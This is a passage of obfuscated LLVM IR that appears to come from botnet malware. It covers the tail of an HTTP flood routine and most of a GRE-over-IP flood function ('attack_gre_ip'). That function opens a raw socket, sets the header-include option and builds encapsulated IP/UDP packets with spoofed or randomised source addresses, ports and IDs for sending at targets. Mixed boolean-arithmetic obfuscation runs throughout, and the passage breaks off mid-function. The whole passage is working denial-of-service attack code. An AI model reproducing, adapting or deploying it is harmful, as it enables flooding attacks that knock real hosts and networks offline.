  %2837 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2837, i32 0, i32 1
  %2839 = load i8, i8* %2838, align 4
  %2840 = zext i8 %2839 to i32
  %2841 = icmp eq i32 %2840, 10
  br i1 %2841, label %2842, label %2887

; <label>:2842:                                   ; preds = %2836
  br label %2843

; <label>:2843:                                   ; preds = %2876, %2842
  %2844 = call i32* @__errno_location() #7
  store i32 0, i32* %2844, align 4
  %2845 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2846 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2845, i32 0, i32 0
  %2847 = load i32, i32* %2846, align 4
  %2848 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2849 = call i64 @recv(i32 %2847, i8* %2848, i64 10240, i32 16384)
  %2850 = trunc i64 %2849 to i32
  store i32 %2850, i32* %12, align 4
  %2851 = load i32, i32* %12, align 4
  %2852 = icmp eq i32 %2851, 0
  br i1 %2852, label %2853, label %2855

; <label>:2853:                                   ; preds = %2843
  %2854 = call i32* @__errno_location() #7
  store i32 104, i32* %2854, align 4
  store i32 -1, i32* %12, align 4
  br label %2855

; <label>:2855:                                   ; preds = %2853, %2843
  %2856 = load i32, i32* %12, align 4
  %2857 = icmp eq i32 %2856, -1
  br i1 %2857, label %2858, label %2876

; <label>:2858:                                   ; preds = %2855
  %2859 = call i32* @__errno_location() #7
  %2860 = load i32, i32* %2859, align 4
  %2861 = icmp ne i32 %2860, 11
  br i1 %2861, label %2862, label %2875

; <label>:2862:                                   ; preds = %2858
  %2863 = call i32* @__errno_location() #7
  %2864 = load i32, i32* %2863, align 4
  %2865 = icmp ne i32 %2864, 11
  br i1 %2865, label %2866, label %2875

; <label>:2866:                                   ; preds = %2862
  %2867 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2868 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2867, i32 0, i32 0
  %2869 = load i32, i32* %2868, align 4
  %2870 = call i32 @close(i32 %2869)
  %2871 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2872 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2871, i32 0, i32 0
  store i32 -1, i32* %2872, align 4
  %2873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2873, i32 0, i32 1
  store i8 0, i8* %2874, align 4
  br label %2875

; <label>:2875:                                   ; preds = %2866, %2862, %2858
  br label %2877

; <label>:2876:                                   ; preds = %2855
  br label %2843

; <label>:2877:                                   ; preds = %2875
  %2878 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2879 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2878, i32 0, i32 1
  %2880 = load i8, i8* %2879, align 4
  %2881 = zext i8 %2880 to i32
  %2882 = icmp ne i32 %2881, 0
  br i1 %2882, label %2883, label %2886

; <label>:2883:                                   ; preds = %2877
  %2884 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2885 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2884, i32 0, i32 1
  store i8 1, i8* %2885, align 4
  br label %2886

; <label>:2886:                                   ; preds = %2883, %2877
  br label %2887

; <label>:2887:                                   ; preds = %2886, %2836
  br label %2888

; <label>:2888:                                   ; preds = %2887, %2835
  br label %2889

; <label>:2889:                                   ; preds = %2888, %2394
  br label %2890

; <label>:2890:                                   ; preds = %2889, %1220
  br label %2891

; <label>:2891:                                   ; preds = %2890, %2354, %1953, %1276, %1259, %1210, %1171
  %2892 = load i32, i32* %9, align 4
  %2893 = sub i32 %2892, 1784180946
  %2894 = add i32 %2893, 1
  %2895 = add i32 %2894, 1784180946
  %2896 = add nsw i32 %2892, 1
  store i32 %2895, i32* %9, align 4
  br label %1158

; <label>:2897:                                   ; preds = %1158
  br label %451

; <label>:2898:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %567

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %87

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* %10, align 4
  %86 = call i32 @close(i32 %85)
  br label %567

; <label>:87:                                     ; preds = %79
  store i32 0, i32* %9, align 4
  br label %88

; <label>:88:                                     ; preds = %329, %87
  %89 = load i32, i32* %9, align 4
  %90 = load i8, i8* %5, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp slt i32 %89, %91
  br i1 %92, label %93, label %334

; <label>:93:                                     ; preds = %88
  %94 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %95 = load i8**, i8*** %11, align 8
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  store i8* %94, i8** %98, align 8
  %99 = load i8**, i8*** %11, align 8
  %100 = load i32, i32* %9, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8*, i8** %99, i64 %101
  %103 = load i8*, i8** %102, align 8
  %104 = bitcast i8* %103 to %struct.iphdr*
  store %struct.iphdr* %104, %struct.iphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i64 1
  %107 = bitcast %struct.iphdr* %106 to %struct.grehdr*
  store %struct.grehdr* %107, %struct.grehdr** %23, align 8
  %108 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %109 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %108, i64 1
  %110 = bitcast %struct.grehdr* %109 to %struct.iphdr*
  store %struct.iphdr* %110, %struct.iphdr** %24, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %112 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %111, i64 1
  %113 = bitcast %struct.iphdr* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %25, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 %116, -1
  %118 = xor i8 15, -1
  %119 = xor i8 98, -1
  %120 = or i8 %117, %118
  %121 = or i8 98, %119
  %122 = xor i8 %120, -1
  %123 = and i8 %122, %121
  %124 = and i8 %116, 15
  %125 = xor i8 %123, -1
  %126 = xor i8 64, -1
  %127 = xor i8 -8, -1
  %128 = and i8 %125, -8
  %129 = and i8 %123, %127
  %130 = and i8 %126, -8
  %131 = and i8 64, %127
  %132 = or i8 %128, %129
  %133 = or i8 %130, %131
  %134 = xor i8 %132, %133
  %135 = or i8 %125, %126
  %136 = xor i8 %135, -1
  %137 = or i8 -8, %127
  %138 = and i8 %136, %137
  %139 = or i8 %134, %138
  %140 = or i8 %123, 64
  store i8 %139, i8* %115, align 4
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = xor i8 %143, -1
  %145 = xor i8 -16, -1
  %146 = xor i8 -16, -1
  %147 = or i8 %144, %145
  %148 = or i8 -16, %146
  %149 = xor i8 %147, -1
  %150 = and i8 %149, %148
  %151 = and i8 %143, -16
  %152 = and i8 %150, 5
  %153 = xor i8 %150, 5
  %154 = or i8 %152, %153
  %155 = or i8 %150, 5
  store i8 %154, i8* %142, align 4
  %156 = load i8, i8* %12, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %18, align 4
  %160 = sext i32 %159 to i64
  %161 = sub i64 0, %160
  %162 = sub i64 52, %161
  %163 = add i64 52, %160
  %164 = trunc i64 %162 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 2
  store i16 %165, i16* %167, align 2
  %168 = load i16, i16* %13, align 2
  %169 = call zeroext i16 @htons(i16 zeroext %168) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 3
  store i16 %169, i16* %171, align 4
  %172 = load i8, i8* %14, align 1
  %173 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 5
  store i8 %172, i8* %174, align 4
  %175 = load i8, i8* %15, align 1
  %176 = icmp ne i8 %175, 0
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %93
  %178 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 4
  store i16 %178, i16* %180, align 2
  br label %181

; <label>:181:                                    ; preds = %177, %93
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 6
  store i8 47, i8* %183, align 1
  %184 = load i32, i32* %21, align 4
  %185 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 8
  store i32 %184, i32* %186, align 4
  %187 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %187, i64 %189
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i32 0, i32 1
  %192 = load i32, i32* %191, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 9
  store i32 %192, i32* %194, align 4
  %195 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %196 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %197 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %199 = bitcast %struct.iphdr* %198 to i8*
  %200 = load i8, i8* %199, align 4
  %201 = xor i8 15, -1
  %202 = xor i8 %200, %201
  %203 = and i8 %202, %200
  %204 = and i8 %200, 15
  %205 = xor i8 %203, -1
  %206 = xor i8 64, -1
  %207 = xor i8 72, -1
  %208 = and i8 %205, 72
  %209 = and i8 %203, %207
  %210 = and i8 %206, 72
  %211 = and i8 64, %207
  %212 = or i8 %208, %209
  %213 = or i8 %210, %211
  %214 = xor i8 %212, %213
  %215 = or i8 %205, %206
  %216 = xor i8 %215, -1
  %217 = or i8 72, %207
  %218 = and i8 %216, %217
  %219 = or i8 %214, %218
  %220 = or i8 %203, 64
  store i8 %219, i8* %199, align 4
  %221 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %222 = bitcast %struct.iphdr* %221 to i8*
  %223 = load i8, i8* %222, align 4
  %224 = xor i8 %223, -1
  %225 = xor i8 -16, -1
  %226 = xor i8 113, -1
  %227 = or i8 %224, %225
  %228 = or i8 113, %226
  %229 = xor i8 %227, -1
  %230 = and i8 %229, %228
  %231 = and i8 %223, -16
  %232 = and i8 %230, 5
  %233 = xor i8 %230, 5
  %234 = or i8 %232, %233
  %235 = or i8 %230, 5
  store i8 %234, i8* %222, align 4
  %236 = load i8, i8* %12, align 1
  %237 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 1
  store i8 %236, i8* %238, align 1
  %239 = load i32, i32* %18, align 4
  %240 = sext i32 %239 to i64
  %241 = sub i64 0, 28
  %242 = sub i64 0, %240
  %243 = add i64 %241, %242
  %244 = sub i64 0, %243
  %245 = add i64 28, %240
  %246 = trunc i64 %244 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #7
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  store i16 %247, i16* %249, align 2
  %250 = load i16, i16* %13, align 2
  %251 = zext i16 %250 to i32
  %252 = xor i32 %251, -1
  %253 = and i32 -1590959761, %252
  %254 = xor i32 -1590959761, -1
  %255 = and i32 %251, %254
  %256 = xor i32 -1, -1
  %257 = and i32 %256, -1590959761
  %258 = and i32 -1, %254
  %259 = or i32 %253, %255
  %260 = or i32 %257, %258
  %261 = xor i32 %259, %260
  %262 = xor i32 %251, -1
  %263 = trunc i32 %261 to i16
  %264 = call zeroext i16 @htons(i16 zeroext %263) #7
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 3
  store i16 %264, i16* %266, align 4
  %267 = load i8, i8* %14, align 1
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 5
  store i8 %267, i8* %269, align 4
  %270 = load i8, i8* %15, align 1
  %271 = icmp ne i8 %270, 0
  br i1 %271, label %272, label %276

; <label>:272:                                    ; preds = %181
  %273 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 4
  store i16 %273, i16* %275, align 2
  br label %276

; <label>:276:                                    ; preds = %272, %181
  %277 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 6
  store i8 17, i8* %278, align 1
  %279 = call i32 @rand_next()
  %280 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 8
  store i32 %279, i32* %281, align 4
  %282 = load i8, i8* %20, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %290

; <label>:284:                                    ; preds = %276
  %285 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 9
  %287 = load i32, i32* %286, align 4
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 9
  store i32 %287, i32* %289, align 4
  br label %310

; <label>:290:                                    ; preds = %276
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 8
  %293 = load i32, i32* %292, align 4
  %294 = sub i32 0, 1024
  %295 = add i32 %293, %294
  %296 = sub i32 %293, 1024
  %297 = xor i32 %295, -1
  %298 = and i32 -2086676880, %297
  %299 = xor i32 -2086676880, -1
  %300 = and i32 %295, %299
  %301 = xor i32 -1, -1
  %302 = and i32 %301, -2086676880
  %303 = and i32 -1, %299
  %304 = or i32 %298, %300
  %305 = or i32 %302, %303
  %306 = xor i32 %304, %305
  %307 = xor i32 %295, -1
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  store i32 %306, i32* %309, align 4
  br label %310

; <label>:310:                                    ; preds = %290, %284
  %311 = load i16, i16* %16, align 2
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 0
  store i16 %312, i16* %314, align 2
  %315 = load i16, i16* %17, align 2
  %316 = call zeroext i16 @htons(i16 zeroext %315) #7
  %317 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  store i16 %316, i16* %318, align 2
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = sub i64 8, -7821066029528122188
  %322 = add i64 %321, %320
  %323 = add i64 %322, -7821066029528122188
  %324 = add i64 8, %320
  %325 = trunc i64 %323 to i16
  %326 = call zeroext i16 @htons(i16 zeroext %325) #7
  %327 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %328 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %327, i32 0, i32 2
  store i16 %326, i16* %328, align 2
  br label %329

; <label>:329:                                    ; preds = %310
  %330 = load i32, i32* %9, align 4
  %331 = sub i32 0, 1
  %332 = sub i32 %330, %331
  %333 = add nsw i32 %330, 1
  store i32 %332, i32* %9, align 4
  br label %88

; <label>:334:                                    ; preds = %88
  br label %335

; <label>:335:                                    ; preds = %566, %334
  store i32 0, i32* %9, align 4
  br label %336

; <label>:336:                                    ; preds = %559, %335
  %337 = load i32, i32* %9, align 4
  %338 = load i8, i8* %5, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp slt i32 %337, %339
  br i1 %340, label %341, label %566

; <label>:341:                                    ; preds = %336
  %342 = load i8**, i8*** %11, align 8
  %343 = load i32, i32* %9, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds i8*, i8** %342, i64 %344
  %346 = load i8*, i8** %345, align 8
  store i8* %346, i8** %26, align 8
  %347 = load i8*, i8** %26, align 8
  %348 = bitcast i8* %347 to %struct.iphdr*
  store %struct.iphdr* %348, %struct.iphdr** %27, align 8
  %349 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i64 1
  %351 = bitcast %struct.iphdr* %350 to %struct.grehdr*
  store %struct.grehdr* %351, %struct.grehdr** %28, align 8
  %352 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %353 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %352, i64 1
  %354 = bitcast %struct.grehdr* %353 to %struct.iphdr*
  store %struct.iphdr* %354, %struct.iphdr** %29, align 8
  %355 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i64 1
  %357 = bitcast %struct.iphdr* %356 to %struct.udphdr*
  store %struct.udphdr* %357, %struct.udphdr** %30, align 8
  %358 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i64 1
  %360 = bitcast %struct.udphdr* %359 to i8*
  store i8* %360, i8** %31, align 8
  %361 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i32 0, i32 2
  %366 = load i8, i8* %365, align 4
  %367 = zext i8 %366 to i32
  %368 = icmp slt i32 %367, 32
  br i1 %368, label %369, label %393

; <label>:369:                                    ; preds = %341
  %370 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %371 = load i32, i32* %9, align 4
  %372 = sext i32 %371 to i64
  %373 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i64 %372
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i32 0, i32 1
  %375 = load i32, i32* %374, align 4
  %376 = call i32 @ntohl(i32 %375) #7
  %377 = call i32 @rand_next()
  %378 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 2
  %383 = load i8, i8* %382, align 4
  %384 = zext i8 %383 to i32
  %385 = lshr i32 %377, %384
  %386 = add i32 %376, 932130649
  %387 = add i32 %386, %385
  %388 = sub i32 %387, 932130649
  %389 = add i32 %376, %385
  %390 = call i32 @htonl(i32 %388) #7
  %391 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 9
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %369, %341
  %394 = load i32, i32* %21, align 4
  %395 = icmp eq i32 %394, -1
  br i1 %395, label %396, label %400

; <label>:396:                                    ; preds = %393
  %397 = call i32 @rand_next()
  %398 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %399 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %398, i32 0, i32 8
  store i32 %397, i32* %399, align 4
  br label %400

; <label>:400:                                    ; preds = %396, %393
  %401 = load i16, i16* %13, align 2
  %402 = zext i16 %401 to i32
  %403 = icmp eq i32 %402, 65535
  br i1 %403, label %404, label %433

; <label>:404:                                    ; preds = %400
  %405 = call i32 @rand_next()
  %406 = xor i32 %405, -1
  %407 = xor i32 65535, -1
  %408 = xor i32 1074078459, -1
  %409 = or i32 %406, %407
  %410 = or i32 1074078459, %408
  %411 = xor i32 %409, -1
  %412 = and i32 %411, %410
  %413 = and i32 %405, 65535
  %414 = trunc i32 %412 to i16
  %415 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 3
  store i16 %414, i16* %416, align 4
  %417 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 3
  %419 = load i16, i16* %418, align 4
  %420 = zext i16 %419 to i32
  %421 = sub i32 0, 1000
  %422 = add i32 %420, %421
  %423 = sub nsw i32 %420, 1000
  %424 = xor i32 %422, -1
  %425 = and i32 -1, %424
  %426 = xor i32 -1, -1
  %427 = and i32 %422, %426
  %428 = or i32 %425, %427
  %429 = xor i32 %422, -1
  %430 = trunc i32 %428 to i16
  %431 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 3
  store i16 %430, i16* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %404, %400
  %434 = load i16, i16* %16, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %450

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = xor i32 %438, -1
  %440 = xor i32 65535, -1
  %441 = xor i32 -1769118409, -1
  %442 = or i32 %439, %440
  %443 = or i32 -1769118409, %441
  %444 = xor i32 %442, -1
  %445 = and i32 %444, %443
  %446 = and i32 %438, 65535
  %447 = trunc i32 %445 to i16
  %448 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %449 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %448, i32 0, i32 0
  store i16 %447, i16* %449, align 2
  br label %450

; <label>:450:                                    ; preds = %437, %433
  %451 = load i16, i16* %17, align 2
  %452 = zext i16 %451 to i32
  %453 = icmp eq i32 %452, 65535
  br i1 %453, label %454, label %467

; <label>:454:                                    ; preds = %450
  %455 = call i32 @rand_next()
  %456 = xor i32 %455, -1
  %457 = xor i32 65535, -1
  %458 = xor i32 -746857191, -1
  %459 = or i32 %456, %457
